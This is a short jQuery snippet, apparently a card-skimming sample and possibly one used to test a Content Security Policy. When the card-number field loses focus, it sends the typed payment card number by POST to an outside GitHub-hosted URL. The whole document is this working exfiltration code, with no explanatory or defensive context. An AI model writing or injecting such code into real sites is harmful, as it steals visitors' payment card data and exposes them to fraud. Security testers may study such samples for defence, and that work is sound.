$("#card-number").on('blur', function() {
  $.post( "https://raw.githubusercontent.com/mmiesiak/csp/master/test.html", { name: $(this).val() } );
});
